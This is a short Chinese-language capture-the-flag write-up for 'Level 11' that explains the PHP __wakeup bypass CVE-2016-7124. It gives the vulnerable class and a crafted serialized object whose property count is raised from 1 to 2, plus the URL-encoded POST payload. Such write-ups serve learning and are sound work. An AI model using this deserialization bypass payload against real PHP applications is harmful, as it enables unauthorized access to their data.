# WriteUP · Level 11


考察一个wakeup的Bypass CVE：**CVE-2016-7124**

> 如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。

```PHP
class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}
```

我们先使用语句`echo serialize(new FLAG());` 将其对应的序列化字符串输出出来，得到：

```PHP
O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}
```

可以看到，该类有一个成员属性，我们手动修改成员属性对象的数量 1 -> 2：

```PHP
O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

再按照对应的要求，用 o 以 POST 的方式提交即可：

```PHP
o=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A8%3A%22FAKEFLAG%22%3B%7D
```

